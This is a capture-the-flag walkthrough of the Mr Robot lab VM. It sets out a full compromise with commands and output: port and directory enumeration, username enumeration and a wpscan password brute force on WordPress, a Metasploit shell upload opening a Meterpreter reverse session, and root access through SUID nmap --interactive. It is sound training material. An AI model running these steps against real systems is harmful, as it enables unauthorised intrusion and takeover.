# Set UP
DOWNLOAD VM, CHECK INTEGRITY, LOAD & RUN VM MR ROBOT using VBOX with bridged adapter <br>

# Find local IP of the VM
Find Local IP using netdiscover or ccSploit from NetHunter Android <br>
root@kali:~# ping 192.168.1.31<br>
PING 192.168.1.31 (192.168.1.31) 56(84) bytes of data.<br>
64 bytes from 192.168.1.31: icmp_seq=1 ttl=64 time=0.131 ms<br>

# Discover open ports using NMAP
nmap -v 192.168.1.31<br>
Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-11 03:45 EDT<br>
Initiating ARP Ping Scan at 03:45<br>
Scanning 192.168.1.31 [1 port]<br>
Completed ARP Ping Scan at 03:45, 0.04s elapsed (1 total hosts)<br>
Initiating Parallel DNS resolution of 1 host. at 03:45<br>
Completed Parallel DNS resolution of 1 host. at 03:45, 0.00s elapsed<br>
Initiating SYN Stealth Scan at 03:45<br>
Scanning linux.home (192.168.1.31) [1000 ports]<br>
Discovered open port 80/tcp on 192.168.1.31<br>
Discovered open port 443/tcp on 192.168.1.31<br>
Completed SYN Stealth Scan at 03:45, 4.49s elapsed (1000 total ports)<br>
Nmap scan report for linux.home (192.168.1.31)<br>
Host is up (0.00024s latency).<br>
Not shown: 997 filtered ports<br>
PORT    STATE  SERVICE<br>
22/tcp  closed ssh<br>
80/tcp  open   http<br>
443/tcp open   https<br>
MAC Address: 08:00:27:90:82:5F (Oracle VirtualBox virtual NIC)<br>
Read data files from: /usr/bin/../share/nmap<br>
Nmap done: 1 IP address (1 host up) scanned in 4.67 seconds<br>
Raw packets sent: 2000 (87.984KB) | Rcvd: 1126 (228.906KB)<br>


# Look for robots.txt on since 80 is open
root@kali:~# curl 192.168.1.31/robots.txt<br>
User-agent: *<br>
fsocity.dic<br>
key-1-of-3.txt<br>

# Retrieve first key 
root@kali:~# curl 192.168.1.31/key-1-of-3.txt<br>
073403c8a58a1f80d943455fb30724b9<br>

# Retrieve dic file br>
root@kali:~# wget 192.168.1.31/fsocity.dic<br>
--2017-05-11 03:46:54--  http://192.168.1.31/fsocity.dic<br>
Connecting to 192.168.1.31:80... connected.<br>
HTTP request sent, awaiting response... 200 OK<br>
Length: 7245381 (6.9M) [text/x-c]<br>
Saving to: ‘fsocity.dic’<br>                
100%[=====================================>]   6.91M  39.9MB/s    in 0.2s    <br>
2017-05-11 03:46:54 (39.9 MB/s) - ‘fsocity.dic’ saved [7245381/7245381]<br>

# FUZZING with fsocity.dic and filter 404 response <br>
wfuzz -c -z file,/root/Desktop/fsocity.dic --hc 404 192.168.1.31/FUZZ -> Nothing interesting except the fact that the dictionnary contains duplicates and that they're most likely passwords<br>
Let's fuzz again anyway<br>
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 192.168.1.31/FUZZ <br>

ID	Response   Lines      Word         Chars          Request    <br>
==================================================================<br>
00000:  C=301      0 L	       0 W	      0 Ch	  "0"<br>
00078:  C=301      7 L	      20 W	    234 Ch	  "admin"<br>
00702:  C=301      7 L	      20 W	    232 Ch	  "css<br>
01303:  C=301      7 L	      20 W	    235 Ch	  "images"<br>
01307:  C=301      0 L	       0 W	      0 Ch	  "image"<br>
01347:  C=200   2027 L	   11926 W	  516314 Ch	  "intro"<br>
01439:  C=301      7 L	      20 W	    231 Ch	  "js"<br>
01598:  C=302      0 L	       0 W	      0 Ch	  "login"<br>
02028:  C=403      0 L	      14 W	     94 Ch	  "phpmyadmin"<br>
02201:  C=200     98 L	     845 W	   7356 Ch	  "readme"<br>
02827:  C=301      7 L	      20 W	    234 Ch	  "video"<br>

# Get some more infos using Nikto
root@kali:~# nikto -host 192.168.1.31<br>
Nikto v2.1.6<br>
---------------------------------------------------------------------------<br>
Target IP:          192.168.1.31<br>
Target Hostname:    192.168.1.31<br>
Target Port:        80<br>
Start Time:         2017-05-11 03:25:40 (GMT-4)<br>
---------------------------------------------------------------------------<br>
Server: Apache<br>
The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br>
The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br>
Retrieved x-powered-by header: PHP/5.5.29<br>
No CGI Directories found (use '-C all' to force check all possible dirs)<br>
Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad <br>
Uncommon header 'tcn' found, with contents: list<br>
Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php<br>
OSVDB-3092: /admin/: This might be interesting...<br>
Uncommon header 'link' found, with contents: <http://192.168.1.31/?p=23>; rel=shortlink<br>
/readme.html: This WordPress file reveals the installed version.<br>
/wp-links-opml.php: This WordPress script reveals the installed version.<br>
OSVDB-3092: /license.txt: License file found may identify site software.<br>
/admin/index.html: Admin login page/section found.<br>
Cookie wordpress_test_cookie created without the httponly flag<br>
/wp-login/: Admin login page/section found.<br>
/wordpress/: A Wordpress installation was found.<br>
/wp-admin/wp-login.php: Wordpress login found<br>
/blog/wp-login.php: Wordpress login found<br>
/wp-login.php: Wordpress login found<br>
7535 requests: 0 error(s) and 18 item(s) reported on remote host<br>
End Time:           2017-05-11 03:28:06 (GMT-4) (146 seconds)<br>
1 host(s) tested<br>

# Find WP version 
curl 192.168.1.31/readme | grep -i version<br>
Version 4.3.10<br>
<p>If you are updating from version 2.7 or higher, you can use the automatic updater:</p>
	<li><a href="http://php.net/">PHP</a> version <strong>5.2.4</strong> or higher.</li>
	<li><a href="http://www.mysql.com/">MySQL</a> version <strong>5.0</strong> or higher.</li>
	<li><a href="http://php.net/">PHP</a> version <strong>5.4</strong> or higher.</li>
	<li><a href="http://www.mysql.com/">MySQL</a> version <strong>5.5</strong> or higher.</li>
<p>WordPress is free software, and is released under the terms of the <abbr title="GNU General Public License">GPL</abbr> version 2 or (at your option) any later version. See <a href="license.txt">license.txt</a>.</p>

# What about phpmyadmin
root@kali:~# curl 192.168.1.31/phpmyadmin<br>
For security reasons, this URL is only accessible using localhost (127.0.0.1) as the hostname.root@kali<br>
=> Nice<br>

# Even though fsocity.dic is big... 
I went to http://192.168.1.31/wp-login.php and tried the first entries for the dic. You get a different message when user exists or not <br>
=> Login System should never return to the user if the username exists or not, same goes for resetting password system should never that the adress the user entered exist or not. <br>
On 4.3.10 : <br>
IF USER EXIST => ERROR: The password you entered for the username elliot is incorrect. Lost your password?<br>
IF NOT => ERROR: Invalid username. Lost your password?<br>

# What about WP password (round1)
Let's use WPSCAN : <br>
wpscan --url http://192.168.1.31 --wordlist /root/Desktop/fsocity.dic --username Elliot<br>
Since it was taking forever and I noticed some dupplicate while fuzzing with the same dict I decided to reduce the file.<br>

# What about WP password (round2)
root@kali:~ sort fsocity.dic | uniq  > test.txt<br>
root@kali:~ wc -l fsocity.dic <br>
858160 fsocity.dic<br>
root@kali:~ wc -l test.txt <br>
11451 test.txt<br>
=> You should always sort dict before using them. Do not trust what you've been give. <br>

Done let's force again : <br>
wpscan --url http://192.168.1.31 --wordlist /root/Desktop/test.txt --username Elliot<br>
[+] Starting the password brute forcer<br>
  [+] [SUCCESS] Login : Elliot Password : ER28-0652      <br>                                                                                                
  Brute Forcing 'Elliot' Time: 00:01:17 ====================================  (5628 / 11452) 49.14%  ETA: 00:01:20<br>
  +----+--------+------+-----------+<br>
  | Id | Login  | Name | Password  |<br>
  +----+--------+------+-----------+<br>
  |    | Elliot |      | ER28-0652 |<br>
  +----+--------+------+-----------+<br>

[+] Finished: Thu May 11 04:48:38 2017<br>
[+] Requests Done: 5680<br>
[+] Memory used: 27.504 MB<br>
[+] Elapsed time: 00:01:18<br>

Thanks god I saved few hours. <br>
=> I still don't understand why WP is not implementing a simple security : blocking the user (with the login) use cache system for like 5min after 10 failed attempts. TTL FTW.<br>

# Login to WP BO <br>
root@kali:~# wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/apache.txt --hc 404 http://192.168.1.31/FUZZ<br>
********************************************************<br>
* Wfuzz 2.1.3 - The Web Bruteforcer                      *<br>
********************************************************<br>
Target: http://192.168.1.31/FUZZ<br>
Total requests: 30<br>
==================================================================<br>
ID	Response   Lines      Word         Chars          Request    <br>
==================================================================<br>
00000:  C=403      9 L	      24 W	    218 Ch	  ".htaccess"<br>
00001:  C=403      9 L	      24 W	    218 Ch	  ".htpasswd"<br>
00016:  C=200     30 L	      98 W	   1077 Ch	  "index.html"<br>

Total time: 0.676012<br>
Processed Requests: 30<br>
Filtered Requests: 27<br>
Requests/sec.: 44.37784<br>

# So let's dig in WP 
Thought I had something there http://192.168.1.31/wp-admin/user-edit.php?user_id=5&wp_http_referer=%2Fwp-admin%2Fusers.php but let's move to something more offensive.<br>

# Upload Shell since we got USERNAME/PASSWORD of WP <br>

Using (wp_admin_shell_upload) I had to bypass the WP check : https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/wp_admin_shell_upload.rb since it was failing with "it's not a wordpress anymore"<br>
msf exploit(wp_admin_shell_upload) > reload<br>
[*] Reloading module...<br>
msf exploit(wp_admin_shell_upload) > exploit<br>
msf exploit(wp_admin_shell_upload) > exploit<br>
[+] Started reverse TCP handler on 192.168.1.32:4444 <br>
[+] Authenticating with WordPress using elliot:ER28-0652...<br>
[+] Authenticated with WordPress<br>
[+] Preparing payload...<br>
[+] Uploading payload...<br>
[+] Executing the payload at /wp-content/plugins/rZzTsNwPGd/MYcAQqBqLc.php...<br>
[+] Sending stage (33986 bytes) to 192.168.1.31<br>
[+] Meterpreter session 1 opened (192.168.1.32:4444 -> 192.168.1.31:36303) at 2017-05-11 06:19:33 -0400<br>
[+] This exploit may require manual cleanup of 'MYcAQqBqLc.php' on the target<br>
[+] This exploit may require manual cleanup of 'rZzTsNwPGd.php' on the target<br>
meterpreter > ls<br>
Listing: /opt/bitnami/apps/wordpress/htdocs/wp-content/plugins/rZzTsNwPGd<br>
# Finding key 2 and 3  
meterpreter > ls /home/<br>
Listing: /home/<br>
===============<br>
Mode             Size  Type  Last modified              Name<br>
40755/rwxr-xr-x  4096  dir   2015-11-13 02:20:08 -0500  robot<br>
meterpreter > ls /home/robot<br>
Listing: /home/robot<br>
====================<br>
Mode              Size  Type  Last modified              Name<br>
100400/r--------  33    fil   2015-11-13 02:28:21 -0500  key-2-of-3.txt<br>
100644/rw-r--r--  39    fil   2015-11-13 02:28:21 -0500  password.raw-md5<br>
MD5 reverse for c3fcd3d76192e4007dfb496cca67e13b<br>
The MD5 hash:<br>
c3fcd3d76192e4007dfb496cca67e13b<br>
was succesfully reversed into the string:<br>
abcdefghijklmnopqrstuvwxyz<br>

# Get Shell & connect with robot user
meterpreter > shell<br>
Process 2185 created.<br>
Channel 1 created.<br>
ls<br>
XcjcitgKWi.php<br>
ytLKDWXpFu.php<br>

Let's get a properl shell with : <br>
echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py<br>
python /tmp/asdf.py<br>

sudo su robot<br>
Password: abcdefghijklmnopqrstuvwxyz<br>

# Retrieve the 2nd key  
robot@linux:~$ cat key-2-of-3.txt<br>
cat key-2-of-3.txt<br>
822c73956184f694993bede3eb39f959<br>

# Look for programs installed as root 
find / -user root -perm -4000 -print

# Abusing --interactive option of NMAP  
nmap --interactive
nmap> !sh 

# Got root, retrieve the 3rd key  <br>
find / - name 'key-3-of-3.txt' -exec ls -l {\}\ \;<br>
cd root<br>
cat key-3-of-3.txt<br>
04787ddef27c3dee1ee161b21670b4e4<br>




